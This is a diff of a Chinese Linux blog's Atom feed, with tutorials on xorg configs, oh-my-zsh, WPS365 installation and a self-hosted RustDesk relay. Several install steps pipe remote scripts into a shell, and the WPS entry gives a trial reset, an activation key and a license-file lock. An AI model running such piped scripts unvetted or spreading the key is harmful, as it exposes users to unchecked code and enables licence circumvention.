title="解决办法:移除刚才的连个配置文件"></a>解决办法:移除刚才的连个配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /usr/share/doc/xserver-xorg-video-intel/xorg.conf ~</span><br><span class="line"><span class="built_in">mv</span> /etc/X11/xorg.conf ~</span><br></pre></td></tr></table></figure><h3 id="恢复正常"><a href="#恢复正常" class="headerlink" title="恢复正常"></a>恢复正常</h3><h5 id="使用虚拟显示器的时候-再把文件移动到原来位置"><a href="#使用虚拟显示器的时候-再把文件移动到原来位置" class="headerlink" title="使用虚拟显示器的时候 再把文件移动到原来位置"></a>使用虚拟显示器的时候 再把文件移动到原来位置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/cc/xorg.conf /usr/share/doc/xserver-xorg-video-intel/xorg.conf</span><br><span class="line"><span class="built_in">mv</span> /home/cc/xorg.conf /etc/X11/xorg.conf </span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ubuntu默认从bash转成zsh的方法和安装插件</title>
+    <link href="https://macin.top/posts/f0c8bdaf/"/>
+    <id>https://macin.top/posts/f0c8bdaf/</id>
+    <published>2024-12-22T10:33:33.000Z</published>
+    <updated>2024-12-24T12:40:19.188Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、安装oh-my-zsh"><a href="#一、安装oh-my-zsh" class="headerlink" title="一、安装oh-my-zsh"></a>一、安装oh-my-zsh</h2><ul><li><p>此版本已经自带了 zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shells</span><br><span class="line"><span class="comment"># /bin/zsh</span></span><br><span class="line"><span class="comment"># 如果没有，执行指令安装</span></span><br><span class="line">apt install zsh</span><br></pre></td></tr></table></figure></li><li><p>将zsh设置为默认终端，退出shell，重开终端，如果设置不生效，重启系统即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$SHELL</span><span class="comment"># 查看当前终端,默认是bash</span></span><br><span class="line">chsh -s /bin/zsh <span class="comment"># 设置默认终端为zsh</span></span><br><span class="line">chsh -s /bin/bash <span class="comment"># 切换回bash终端</span></span><br></pre></td></tr></table></figure></li><li><p>安装zsh完成后，进入官网：<a href="https://ohmyz.sh/#install%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85">https://ohmyz.sh/#install，使用命令进行安装</a> <code>oh-my-zsh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># curl 方式</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或 wget 方式</span></span><br><span class="line">$ sh -c <span class="string">&quot;<span class="subst">$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>注意：由于“不知名原因”，可能出现无法下载情况，如：<code>installer: Failed to connect to github: Connection refused</code>，此处可从github上寻找解决方法。</strong></p><ul><li>操作地址： <a href="https://github.com/ohmyzsh/ohmyzsh/issues/9465">https://github.com/ohmyzsh/ohmyzsh/issues/9465</a></li><li>将<strong>域名和ip</strong>（网址：<a href="https://www.ipaddress.com/">https://www.ipaddress.com/ </a>）对应关系写入 <code>/etc/hosts</code> 文件，执行命令安装，如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/hosts /etc/hosts.bak <span class="comment"># 备份</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;140.82.113.3 github.com&quot;</span>&gt;&gt;/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;185.199.110.133 raw.githubusercontent.com&quot;</span>&gt;&gt;/etc/hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh </span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></li><li><p>退出shell，重开终端，如果设置不生效，重启系统即可。</p></li></ul><h2 id="二、安装自动补全插件和高亮插件"><a href="#二、安装自动补全插件和高亮插件" class="headerlink" title="二、安装自动补全插件和高亮插件"></a>二、安装自动补全插件和高亮插件</h2><ul><li><p>参考链接： <a href="https://www.jianshu.com/p/9c8c4886281f">https://www.jianshu.com/p/9c8c4886281f</a>.</p></li><li><p>自动补全插件下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$ZSH</span>/custom/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git</span><br></pre></td></tr></table></figure></li><li><p>高亮插件下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$ZSH</span>/custom/plugins</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git</span><br></pre></td></tr></table></figure></li><li><p>修改 <code>~/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 plugins=(git)</span></span><br><span class="line">plugins=(git zsh-autosuggestions zsh-syntax-highlighting)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh</span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line"><span class="comment"># 使配置生效，执行</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure></li><li><p>退出shell，重开终端，如果设置不生效，重启系统即可。</p></li></ul>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux版wps365下载安装激活</title>
+    <link href="https://macin.top/posts/441fb385/"/>
+    <id>https://macin.top/posts/441fb385/</id>
+    <published>2024-12-22T10:20:06.000Z</published>
+    <updated>2024-12-24T12:40:19.186Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="linux-wps"><a href="#linux-wps" class="headerlink" title="linux-wps"></a>linux-wps</h1><p>Linux 打包 安装 WPS365 (wps-office_12.8.2.17001)</p><h1 id="已测试"><a href="#已测试" class="headerlink" title="已测试"></a>已测试</h1><ul><li>ubuntu 22.04</li><li>ubuntu 24.04</li></ul><h1 id="一键安装"><a href="#一键安装" class="headerlink" title="一键安装"></a>一键安装</h1><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/atopx/linux-wps/master/install.sh | bash</span><br></pre></td></tr></table></figure><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/atopx/linux-wps/master/install.sh | bash</span><br></pre></td></tr></table></figure><h3 id="重置试用期"><a href="#重置试用期" class="headerlink" title="重置试用期"></a>重置试用期</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$HOME</span>/.config/Kingsoft <span class="variable">$HOME</span>/.local/share/Kingsoft</span><br></pre></td></tr></table></figure><h3 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">694BF-YUDBG-EAR69-BPRGB-ATQXH</span><br><span class="line"><span class="comment"># 使用后执行</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 444 /opt/kingsoft/.auth/license2.dat</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">wps,linux,os</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>docker搭建rustdesk id中继服务器</title>
+    <link href="https://macin.top/posts/8832024/"/>
+    <id>https://macin.top/posts/8832024/</id>
+    <published>2024-12-21T12:20:25.000Z</published>
+    <updated>2024-12-24T12:40:19.183Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><p>创建一下安装的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure><p><code>docker-compose.yml</code>填入以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rustdesk-net:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">hbbs:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbs</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21115</span><span class="string">:21115</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116/udp</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21118</span><span class="string">:21118</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbs</span> <span class="string">-r</span> <span class="string">hbbs.example.com:21117</span>   <span class="comment"># hbbs.example.com改成自己的服务器ip或者域名</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbs:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">hbbr:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21117</span><span class="string">:21117</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21119</span><span class="string">:21119</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbr:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><p>没问题的话，<code>ctrl+x</code>退出，按<code>y</code>保存，<code>enter</code>确认。</p><p>打开防火墙的端口<code>21115</code>、<code>21116</code>、<code>21117</code>、<code>21118</code>、<code>21119</code></p><blockquote><p>默认情况下，hbbs 监听<code>21115(tcp)</code>, <code>21116(tcp/udp)</code>, <code>21118(tcp)</code>，hbbr 监听<code>21117(tcp)</code>, <code>21119(tcp)</code>。</p><p>务必在防火墙开启这几个端口， **请注意<code>21116</code>同时要开启<code>TCP</code>和<code>UDP</code>**。</p><p>其中<code>21115</code>是hbbs用作NAT类型测试，<code>21116/UDP</code>是hbbs用作ID注册与心跳服务，<code>21116/TCP</code>是hbbs用作TCP打洞与连接服务，<code>21117</code>是hbbr用作中继服务, <code>21118</code>和<code>21119</code>是为了支持网页客户端。</p><p>如果您不需要网页客户端<code>（21118，21119）</code>支持，对应端口可以不开。</p></blockquote><ul><li>TCP(<strong>21115, 21116, 21117, 21118, 21119</strong>)</li><li>UDP(<strong>21116</strong>)</li></ul><p><a href="https://img.laoda.de/i/2022/06/30/zlio5h-2.webp"><img src="/img/rustdesk/1.webp" alt="image-20220630215240864"></a><br><a href="https://img.laoda.de/i/2022/06/30/10h3dqt-2.webp"><img src="/img/rustdesk/2.webp" alt="image-20220630220546335"></a><br><a href="https://img.laoda.de/i/2022/06/30/zkvklo-2.webp"><img src="/img/rustdesk/3.webp" alt="image-20220630215134217"></a><br><a href="https://img.laoda.de/i/2022/06/30/10hlio9-2.webp"><img src="/img/rustdesk/4.webp" alt="image-20220630220629996"></a></p><p>查看端口是否被占用（以<code>21115</code>为例），输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:21115  <span class="comment">#查看21115端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure><p>如果出现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装lsof</span></span><br></pre></td></tr></table></figure><p>如果端口没有被占用，我们接着可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk</span><br><span class="line"></span><br><span class="line">docker-compose up -d  </span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p>1、不知道服务器IP，可以直接在命令行输入：<code>curl ip.sb</code>，会显示当前服务器的IP。</p><p>2、遇到访问不了的情况，请在宝塔面板的防火墙和服务商的后台防火墙里打开对应端口。</p></blockquote><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/rustdesk /root/data/docker_data/rustdesk.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose pull    <span class="comment"># 拉取最新的镜像</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d   <span class="comment"># 重新更新当前镜像</span></span><br></pre></td></tr></table></figure><p>利用Docker-compose搭建的应用，更新非常容易～</p><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/rustdesk  <span class="comment"># 进入docker-compose所在的文件夹</span></span><br><span class="line"></span><br><span class="line">docker-compose down    <span class="comment"># 停止容器，此时不会删除映射到本地的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/rustdesk  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure><h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><h3 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h3><p>见咕咕鸽的视频</p><p>点击 ID 右侧的菜单按钮如下，选择“ ID&#x2F;中继服务器”。</p><p><a href="https://img.laoda.de/i/2022/06/30/10vdndr-2.webp"><img src="/img/rustdesk/5.webp" alt="img"></a></p><p>在 ID 服务器输入框中（被控端+主控端）输入 hbbs 主机或 ip 地址，另外两个地址可以不填，<a href="https://iwanlab.com/tag/rustdesk/">RustDesk</a>会自动推导（如果没有特别设定），中继服务器指的是hbbr（21116）端口。</p><p>例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hbbs.example.com</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hbbs.example.com:21116</span><br></pre></td></tr></table></figure><p><a href="https://img.laoda.de/i/2022/06/30/10werrl-2.webp"><img src="/img/rustdesk/6.webp" alt="img"></a><br><a href="https://img.laoda.de/i/2022/06/30/126s6aa-2.webp"><img src="/img/rustdesk/7.webp" alt="image-20220630230905895"></a><br><a href="https://img.laoda.de/i/2022/06/30/127cdzg-2.webp"><img src="/img/rustdesk/8.webp" alt="image-20220630231000711"></a><br><a href="https://img.laoda.de/i/2022/06/30/12b7cbz-2.webp"><img src="/img/rustdesk/9.webp" alt="image-20220630231648227"></a><br><a href="https://img.laoda.de/i/2022/06/30/128m0xb-2.webp"><img src="/img/rustdesk/10.webp" alt="image-20220630231211642"></a></p><h4 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h4><p><a href="https://img.laoda.de/i/2022/06/30/12awwj1-2.webp"><img src="/img/rustdesk/11.webp" alt="image-20220630231557544"></a><br><a href="https://img.laoda.de/i/2022/06/30/12bpj3z-2.webp"><img src="/img/rustdesk/12.webp" alt="image-20220630231732435"></a><br><a href="https://img.laoda.de/i/2022/06/30/12c44fx-2.webp"><img src="/img/rustdesk/13.webp" alt="image-20220630231801433"></a></p><h4 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h4><p><a href="https://img.laoda.de/i/2022/06/30/12crxpe-2.webp"><img src="/img/rustdesk/18.webp" alt="image-20220630231912131"></a><br><a href="https://img.laoda.de/i/2022/06/30/12dih3s-2.webp"><img src="/img/rustdesk/14.webp" alt="image-20220630232034319"></a></p><h3 id="几个小问题"><a href="#几个小问题" class="headerlink" title="几个小问题"></a>几个小问题</h3><h4 id="加密通话"><a href="#加密通话" class="headerlink" title="加密通话"></a>加密通话</h4><p>最新版必须过设置Key，来加密通话。</p><p>以下来自<a href="https://rustdesk.com/docs/zh-cn/self-host/install/">官方文档</a>：</p><p>hbbs在第一次运行时，会自动产生一对加密私钥和公钥（分别位于运行目录下的<code>id_ed25519</code>和<code>id_ed25519.pub</code>文件中），其主要用途是为了通讯加密。</p><p><a href="https://img.laoda.de/i/2022/06/30/111dylz-2.webp"><img src="/img/rustdesk/15.webp" alt="image-20220630223952511"></a></p><p>如果您在上一步骤中没有填写<code>Key:</code>(公钥文件<code>id_ed25519.pub</code>中的内容)，会影响连接，且无法加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/data/docker_data/rustdesk/hbbs/id_ed25519.pub</span><br></pre></td></tr></table></figure><p><a href="https://img.laoda.de/i/2022/06/30/111y9hm-2.webp"><img src="/img/rustdesk/16.webp" alt="image-20220630224047960"></a></p><p>如果您禁止没有key的用户建立非加密连接，请在运行hbbs和hbbr的时候添加<code>-k _ </code>参数，例如:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">rustdesk-net:</span></span><br><span class="line">    <span class="attr">external:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">hbbs:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbs</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21115</span><span class="string">:21115</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21116</span><span class="string">:21116/udp</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21118</span><span class="string">:21118</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbs</span> <span class="string">-r</span> <span class="string">hbbs.example.com:21117</span> <span class="string">-k</span> <span class="string">_</span>     <span class="comment"># 加上-k _ </span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbs:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">hbbr:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hbbr</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21117</span><span class="string">:21117</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">21119</span><span class="string">:21119</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">rustdesk/rustdesk-server:latest</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">hbbr</span> <span class="string">-k</span> <span class="string">_</span> <span class="comment"># 加上-k _ </span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./hbbr:/root</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">rustdesk-net</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><blockquote><p>实测加上<code>-k _</code>参数后，会导致无法连接，不确定是不是BUG，有解决的小伙伴欢迎在评论区留言交流！</p></blockquote><p>如果要更改key，请删除 <code>id_ed25519</code> 和 <code>id_ed25519.pub</code> 文件并重新启动 hbbs&#x2F;hbbr，hbbs将会产生新的密钥对。</p><h4 id="把配置放在可执行文件名里-Windows-only"><a href="#把配置放在可执行文件名里-Windows-only" class="headerlink" title="把配置放在可执行文件名里 (Windows only)"></a>把配置放在可执行文件名里 (Windows only)</h4><p>把<code>rustdesk.exe</code> 修改为 rustdesk-<code>host=&lt;host-ip-or-name&gt;,key=&lt;public-key-string&gt;</code>.exe, 例如： rustdesk-<code>host=192.168.1.137,key=xfdsfsd32=32</code>.exe，你可以在About窗口看到配置结果，如下图所示。</p><p><code>host</code> 和 <code>key</code> 都需要添加，缺少一个就不好使。</p><blockquote><p>如果密钥中有无效字符而不能用于文件名，请删除<code>id_ed25519</code>文件并重新启动hbbs&#x2F;hbbr，<code>id_ed25519.pub</code>文件将被重新生成，请重复操作直到获得有效字符。</p></blockquote><table><thead><tr><th align="left">Menu</th><th align="left">About Page</th></tr></thead><tbody><tr><td align="left"><a href="https://rustdesk.com/docs/en/self-host/install/images/aboutmenu.png"><img src="/img/rustdesk/19.webp" alt="img"></a></td><td align="left"><a href="https://rustdesk.com/docs/en/self-host/install/images/lic.png"><img src="/img/rustdesk/17.webp" alt="img"></a></td></tr></tbody></table><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>祝大家用得开心，有问题可以去GitHub提<a 